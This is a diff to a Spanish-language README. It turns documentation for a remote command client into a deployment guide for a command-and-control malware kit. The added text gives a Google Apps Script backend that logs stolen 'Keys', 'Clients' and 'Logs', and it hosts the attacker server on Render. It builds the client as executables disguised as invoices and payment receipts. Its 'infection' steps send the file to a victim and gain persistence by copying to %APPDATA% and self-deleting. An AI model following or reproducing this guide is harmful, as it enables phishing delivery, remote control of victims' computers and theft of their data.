@@ -1,158 +1,103 @@
-# 📖 Instrucciones de Uso - Cliente Remoto
+# 📦 Instrucciones de Despliegue e Instalación
 
-## 🚀 Configuración Inicial
+## 1. Configuración de la Base de Datos (Google Sheets)
+Para evitar la pérdida de claves cuando el servidor gratuito de Render se reinicia, usaremos Google Sheets como base de datos persistente.
 
-### PC1 (Servidor)
+### Paso 1: Crear el Script
+1.  Ve a [Google Sheets](https://sheets.new) y crea una nueva hoja llamada `C2_Database`.
+2.  Ve al menú **Extensiones** > **Apps Script**.
+3.  Borra el código existente y pega el siguiente **Script de Persistencia**:
 
-1. **Instalar dependencias:**
-```bash
-npm install
-```
-
-2. **Iniciar el servidor:**
-```bash
-npm start
-```
-
-El servidor estará disponible en `http://localhost:3000`
-
-3. **Obtener la IP de tu PC1:**
-   - Abre CMD y ejecuta: `ipconfig`
-   - Busca "Dirección IPv4" (ejemplo: 192.168.1.100)
-
-### PC2 (Cliente)
-
-#### Opción 1: Ejecutar directamente con Node.js
-
-1. **Copiar `cliente.js` a PC2**
-
-2. **Instalar dependencias:**
-```bash
-npm install socket.io-client
-```
-
-3. **Editar `cliente.js`** y cambiar la línea:
 ```javascript
-const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';
+/* C2 Persistence API - Pegar esto en Google Apps Script */
+const SHEET_ID = SpreadsheetApp.getActiveSpreadsheet().getId();
+
+function doPost(e) {
+  const lock = LockService.getScriptLock();
+  lock.tryLock(10000);
+  
+  try {
+    const data = JSON.parse(e.postData.contents);
+    const sheetName = data.type || "Logs"; // Puede ser 'Keys', 'Clients', 'Logs'
+    const ss = SpreadsheetApp.openById(SHEET_ID);
+    let sheet = ss.getSheetByName(sheetName);
+    
+    // Crear hoja si no existe
+    if (!sheet) {
+      sheet = ss.insertSheet(sheetName);
+      sheet.appendRow(["Timestamp", ...Object.keys(data.payload)]); // Headers
+    }
+    
+    // Guardar datos
+    const row = [new Date(), ...Object.values(data.payload)];
+    sheet.appendRow(row);
+    
+    return ContentService.createTextOutput(JSON.stringify({result: "success"}));
+  } catch (e) {
+    return ContentService.createTextOutput(JSON.stringify({result: "error", error: e.toString()}));
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+function doGet(e) {
+  return ContentService.createTextOutput(JSON.stringify({status: "alive", version: "1.0"}));
+}
 ```
-Por:
-```javascript
-const SERVER_URL = process.env.SERVER_URL || 'http://IP_DE_PC1:3000';
-```
-Reemplaza `IP_DE_PC1` con la IP que obtuviste (ejemplo: `http://192.168.1.100:3000`)
 
-4. **Ejecutar el cliente:**
-```bash
-node cliente.js
-```
+### Paso 2: Desplegar como API
+1.  En Apps Script, haz clic en **"Implementar" (Deploy)** > **"Nueva implementación"**.
+2.  Tipo: **Aplicación web**.
+3.  Descripción: `C2 API`.
+4.  Quién tiene acceso: **Cualquier usuario** (Esto es CRÍTICO para que el servidor pueda escribir sin login).
+5.  Copia la **URL de la aplicación web** generada (empieza por `https://script.google.com/macros/s/...`).
 
-O usando variable de entorno:
-```bash
-$env:SERVER_URL="http://192.168.1.100:3000"; node cliente.js
-```
+---
 
-#### Opción 2: Crear ejecutable (.exe)
+## 2. Instalación del Servidor (PC Atacante / Render)
 
-Desde PC1 (o cualquier PC con Node.js):
+### Opción A: Render (Recomendado)
+1.  Sube este código a tu repositorio de GitHub.
+2.  Crea un nuevo **Web Service** en Render.com conectado a tu repo.
+3.  En "Environment Variables" añade (opcional):
+    *   `GOOGLE_SCRIPT_URL`: La URL que copiaste en el paso anterior.
+4.  El autodespliegue se encargará del resto usando `render.yaml`.
 
-1. **Instalar pkg:**
-```bash
-npm install -g pkg
-```
+### Opción B: Local (Pruebas)
+1.  Instalar dependencias:
+    ```bash
+    npm install
+    ```
+2.  Iniciar servidor:
+    ```bash
+    npm start
+    ```
 
-2. **Crear ejecutable:**
-```bash
-npm run build-client
-```
+---
 
-Esto creará `cliente.exe` en la carpeta del proyecto.
+## 3. Compilación del Cliente (Malware)
 
-3. **Configurar el ejecutable:**
-   
-   **Opción A:** Editar `cliente.js` antes de crear el ejecutable (ver Opción 1, paso 3)
-   
-   **Opción B:** Crear un archivo de configuración `config.json` o usar variables de entorno
+### Requisitos Previoss
+*   Tener Node.js instalado.
+*   Conocer la URL de tu servidor (ej. `https://mi-proyecto-c2.onrender.com` o `http://localhost:3000`).
 
-4. **Copiar `cliente.exe` a PC2**
+### Pasos de Compilación
+1.  Edita `cliente.js` y asegúrate de que tu URL esté en la lista `SERVERS` o usa variables de entorno.
+2.  Ejecuta el script de construcción automatizado:
+    ```bash
+    npm run build-client
+    ```
+3.  El sistema intentará generar varios ejecutables kamikaze en la carpeta `dist/`:
+    *   `Factura_Electronica_Enero2026.exe` (Prioridad)
+    *   `Comprobante_Pago_2026.exe` (Secundario)
 
-5. **Crear un archivo `.bat` en PC2** para ejecutar el cliente:
-   
-   `iniciar-cliente.bat`:
-   ```batch
-   @echo off
-   set SERVER_URL=http://192.168.1.100:3000
-   cliente.exe
-   pause
-   ```
-   
-   Reemplaza `192.168.1.100` con la IP de PC1.
+---
 
-6. **Ejecutar `iniciar-cliente.bat`** en PC2
+## 4. Infección (PC Víctima)
 
-## 🔧 Uso
-
-### Desde PC1 (Interfaz Web)
-
-1. Abre el navegador en: `http://localhost:3000`
-
-2. Verás la lista de clientes conectados en la sección "Clientes Conectados"
-
-3. Selecciona el destino:
-   - **🖥️ PC Local**: Ejecuta comandos en PC1
-   - **📡 Cliente-X**: Ejecuta comandos en PC2 u otros clientes conectados
-
-4. Ingresa un comando (ejemplo: `dir`, `ipconfig`, `whoami`)
-
-5. Haz clic en "Ejecutar" o presiona Enter
-
-6. El resultado se mostrará en pantalla
-
-### Verificación
-
-- El cliente mostrará mensajes en consola cuando:
-  - Se conecta al servidor
-  - Recibe un comando
-  - Ejecuta un comando exitosamente
-  - Ocurre un error
-
-## 🔒 Seguridad
-
-⚠️ **IMPORTANTE:** Este sistema ejecuta comandos directamente en las PCs. Úsalo solo en redes confiables o con autenticación adicional.
-
-### Recomendaciones:
-
-1. **Firewall:** Asegúrate de que el puerto 3000 esté abierto solo en tu red local
-2. **Autenticación:** Considera agregar autenticación antes de usar en producción
-3. **Red privada:** Úsalo solo en redes privadas, nunca expongas a internet
-
-## 🐛 Solución de Problemas
-
-### El cliente no se conecta
-
-1. Verifica que el servidor esté corriendo en PC1
-2. Verifica que la IP en `cliente.js` sea correcta
-3. Verifica que el firewall de PC1 permita conexiones en el puerto 3000
-4. Verifica que ambas PCs estén en la misma red
-
-### Comandos no se ejecutan remotamente
-
-1. Verifica que el cliente esté conectado (debería aparecer en la lista de clientes)
-2. Verifica que seleccionaste el cliente correcto en el selector
-3. Revisa los logs del cliente para ver si recibió el comando
-
-### El ejecutable no funciona
-
-1. Verifica que tengas Node.js instalado si ejecutas directamente
-2. Si creaste el ejecutable, verifica que sea compatible con la arquitectura de PC2 (64-bit)
-3. Intenta ejecutar `cliente.js` directamente con Node.js primero para verificar la conexión
-
-## 📝 Ejemplos de Comandos
-
-- `dir` - Listar archivos
-- `ipconfig` - Información de red
-- `whoami` - Usuario actual
-- `systeminfo` - Información del sistema
-- `echo Hola Mundo` - Imprimir texto
-- `cd C:\ && dir` - Cambiar directorio y listar
-
-pkg cliente.js --targets node18-win-x64 --output cliente.exe                                                                  
+1.  Envía el ejecutable `.exe` generado a la máquina objetivo (VM de pruebas).
+2.  Ejecútalo (Doble clic).
+    *   Si pide permisos de Administrador (UAC), **Aceptar** para persistencia completa.
+    *   Si se deniega, funcionará en modo usuario limitado.
+3.  El malware se copiará a `%APPDATA%` y se borrará del escritorio (simulando un instalador).
+4.  Verifica en el Dashboard Web que el cliente aparezca conectado "Online".
